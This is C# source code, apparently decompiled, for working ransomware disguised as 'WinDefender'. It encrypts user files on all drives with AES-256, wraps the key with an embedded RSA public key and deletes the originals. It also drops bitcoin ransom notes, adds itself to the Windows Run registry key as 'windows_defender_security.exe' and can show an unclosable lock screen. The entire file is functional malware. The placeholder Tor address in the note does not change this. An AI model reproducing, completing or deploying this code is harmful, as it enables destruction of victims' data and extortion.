using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml.Serialization;
using Microsoft.Win32;

namespace WinDefender;

internal class Program : Form
{
	public static string readme = "Hello.\r\nAll your files have been encrypted by a ransomware.\r\nTo recover your documents,videos,photos,you need to have the secret decryption software.\r\nYour files have been encrypted with AES-256 encryption alghoritm.\r\nA key is stored in a .key file. Do not remove it!\r\nThe .key file contains the key encrypted with RSA 2048. Withouth it we wont be able to decrypt your files.\r\nTo get the decryption software, you will need to pay 0.01 bitcoin at this wallet b22cc75e24f62d8110815d04aa5a5d9951a43f90fe2581f4a2ee0708d61782.\r\nDownload Tor Browser and go on that website : lmao testing nope ransomezgfjkezspqgqs\r\n\r\nGet pwned.";

	public static List<string> blacklisted_ext = new List<string> { ".db", ".ini", ".sys", ".exe", ".dll", ".key", ".dat", ".etl" };

	public static bool Lock_Screen = false;

	public static bool Drop_Readme_Desktop = true;

	public static bool Drop_Readme_Everywhere = true;

	public static string key = "";

	public static string public_key = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\n<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n  <Exponent>AQAB</Exponent>\n  <Modulus>4WwSDoXKK4/n8pS81mIbRUr6WQcQk1/be3oTGt5wixM4MyuY2HmCasKnsHabPjXJa5frBkRLKOYgSFAX8ChLXWyFnqL9Qx+q6NKwBaTQ19/tQpB+Ah0S07+NNtM3eAjXGRiNclag6m19XKYCgaMeHYXKGWabSDh+1K0n9eLg99Xdewek3peQFhyPBoiwqrh3l31N/MHV0lCIEuxbKA+wq3Zi9gtLYHL4jkRHEq4JA9G66EPDifx+kXxw/hZd/9kOsdVjN2oXFpt7tJA9pH+1N38Tl5uFV6wT0HY9soDh0DnWuCLAtxQyHO6JEj1Beng8wb0jRY+t2seVotleo1teQQ==</Modulus>\n</RSAParameters>";

	public static string ext = ".crypted";

	public static RSAParameters pubKey;

	private static List<string> DirSearch(string sDir)
	{
		List<string> list = new List<string>();
		try
		{
			if (sDir.Contains("AppData\\"))
			{
				return list;
			}
			if (sDir.Contains("Windows\\"))
			{
				return list;
			}
			if (sDir.Contains("Common Files\\"))
			{
				return list;
			}
			if (sDir.Contains("WindowsPowerShell\\"))
			{
				return list;
			}
			if (sDir.Contains("Microsoft\\Provisioning\\"))
			{
				return list;
			}
			if (sDir.Contains("ProgramData"))
			{
				return list;
			}
			if (sDir.Contains("Program Files"))
			{
				return list;
			}
			string[] files = Directory.GetFiles(sDir);
			foreach (string item in files)
			{
				list.Add(item);
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				list.AddRange(DirSearch(sDir2));
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static void EncryptFile(string file)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(file + ext, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(key);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(file, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				File.Delete(file);
			}
			catch (Exception)
			{
				File.Delete(file + ext);
			}
		}
	}

	public static void EncryptFolder(string dir)
	{
		List<string> list = DirSearch(dir);
		Console.WriteLine(list.Count);
		foreach (string item in list)
		{
			try
			{
				string extension = Path.GetExtension(item);
				if (item.EndsWith(ext) || blacklisted_ext.Contains(extension) || item.EndsWith("@READ_ME@.txt"))
				{
					continue;
				}
				bool flag = false;
				bool flag2 = false;
				bool flag3 = new FileInfo(item).Attributes.HasFlag(FileAttributes.ReadOnly);
				using (FileStream fileStream = new FileStream(item, FileMode.Open))
				{
					flag2 = fileStream.CanRead;
					flag = fileStream.CanWrite;
				}
				if (!flag3 && flag && flag2)
				{
					Console.WriteLine(item);
					EncryptFile(item);
					if (Drop_Readme_Everywhere)
					{
						DropReadme(new FileInfo(item).Directory!.FullName);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static string genRandomString(int length)
	{
		Random random = new Random();
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyz";
		text2 += text2.ToUpper();
		text2 += "0123456789";
		for (int i = 0; i < length; i++)
		{
			text += text2[random.Next(0, text2.Length - 1)];
		}
		return text;
	}

	private static void SetStartup()
	{
		if (Application.get_ExecutablePath() != Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/windows_defender_security.exe")
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/windows_defender_security.exe"))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/windows_defender_security.exe");
			}
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/windows_defender_security.exe");
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Windows Security Defender", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/windows_defender_security.exe");
	}

	public Program()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Expected O, but got Unknown
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_BackColor(Color.FromArgb(32, 32, 32));
		Label val = new Label();
		((Control)val).set_ForeColor(Color.White);
		((Control)val).set_Size(new Size(1900, 1060));
		((Control)val).set_Location(new Point(10, 10));
		((Control)val).set_Font(new Font(((Control)val).get_Font().get_FontFamily(), 20f, ((Control)val).get_Font().get_Style()));
		((Control)val).set_Text(readme);
		((Control)this).get_Controls().Add((Control)(object)val);
		((Form)this).add_FormClosing(new FormClosingEventHandler(SR_Closing));
		((Form)this).set_TopMost(true);
	}

	private void SR_Closing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_TopMost(true);
	}

	public static void SaveKey(string key)
	{
		StringReader textReader = new StringReader(public_key);
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		pubKey = (RSAParameters)xmlSerializer.Deserialize(textReader);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(pubKey);
		byte[] bytes = Encoding.UTF8.GetBytes(key);
		byte[] bytes2 = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
		File.WriteAllBytes("DO_NOT_DELETE.key", bytes2);
	}

	public static void EncryptDisks()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady)
				{
					EncryptFolder(driveInfo.Name);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static void DropReadme(string folderpath)
	{
		try
		{
			string path = folderpath + "\\@READ_ME@.txt";
			if (!File.Exists(path))
			{
				File.WriteAllText(folderpath + "\\@READ_ME@.txt", readme);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void Main(string[] args)
	{
		SetStartup();
		key = genRandomString(20);
		SaveKey(key);
		if (Drop_Readme_Desktop)
		{
			DropReadme(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		}
		EncryptDisks();
		if (Lock_Screen)
		{
			Application.Run((Form)(object)new Program());
		}
	}
}
